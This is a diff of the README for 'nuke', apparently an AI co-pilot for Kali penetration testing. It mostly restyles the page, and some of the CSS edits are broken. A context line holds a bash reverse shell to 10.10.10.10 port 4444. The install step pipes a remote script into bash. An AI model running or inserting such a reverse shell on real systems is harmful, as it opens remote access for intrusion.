@@ -1,12 +1,12 @@
 <div align="center">
 
-<img src="assets/nukepic.jpg" width="220" style="image-rendering:pixelated; filter:drop-shadow(0 0 20px #0f0);">
+<img src="assets/nukepic.jpg" width="220" style="image-rendering:pixelated; filter:(0 0 20 #0f0);">
 
 <br><br>
 
 # <span style="color:#ff0040; text-shadow: 0 0 20px #ff0040; font-size:3.5em; font-family: 'Courier New', monospace;">n u k e</span>
 
-<span style="color:#00ff00; font-size:1.6em; text-shadow: 0 0 15px #0f0;">the kali co-pilot that runs when you press **r**</span>
+<span style="color:#00ff00; font-size:1.6; text-shadow: 0 0 15 #0f0;">the kali co-pilot that runs when you press **r**</span>
 
 <br><br>
 
@@ -35,7 +35,7 @@ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 
 <br>
 
-### <span style="color:#ff0040; font-size:2em;">Install in 15 seconds</span>
+### <span style="color:#ff0040; font-size:2em;">Install in 15 seconds One line Install Just copy and past </span>
 
 ```bash
 curl -sSL https://raw.githubusercontent.com/notjustdanish/nuke/main/install.sh | bash
